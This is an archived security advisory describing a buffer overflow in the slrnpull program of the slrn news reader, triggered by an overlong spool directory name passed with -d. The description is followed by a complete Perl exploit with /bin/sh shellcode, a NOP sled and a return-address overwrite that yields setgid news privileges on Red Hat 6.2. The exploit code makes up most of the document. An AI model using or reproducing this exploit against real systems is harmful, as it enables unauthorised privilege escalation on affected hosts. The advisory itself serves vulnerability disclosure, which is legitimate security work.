source: http://www.securityfocus.com/bid/4569/info

N is a freely available, open source news reading utility. It is developed and maintained by the SLRN project, and designed for use on various operating systems. This problem affects the UNIX and Linux implementation.

Due to a boundary condition error, a buffer overflow condition exists in spool directory names. This problem affects the slrnpull program, included as part of the slrn package. When slrnpull is executed with the -d flag, and a file name of greater than 4091 bytes, the overflow makes it possible to overwrite process memory, including the return address.

#!/bin/sh
echo DEFANGED.5
exit
#!/usr/bin/perl
#
# Credits for the vulnerability: Alex Hernandez (its setgid news not root)
# The exploit was written by:    zillion@snosoft.com / safemode.org
# http://www.safemode.org 
# http://www.snosoft.com
#
# Gain setgid news on a Red Hat 6.2 Intel box

$shellcode = 
        "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46".
        "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1".
        "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

$offset  = "-500"; 
$esp     = 0xbfffe2cc;

for ($i = 0; $i < (2041 - (length($shellcode)) - 4); $i++) {
    $buffer .= "\x90";
}

$buffer .= $shellcode;
$buffer .= pack('l', ($esp + $offset)); 

print("The new return address: 0x", sprintf('%lx',($esp + $offset)), "\n");

exec("/usr/bin/slrnpull -d '$buffer'");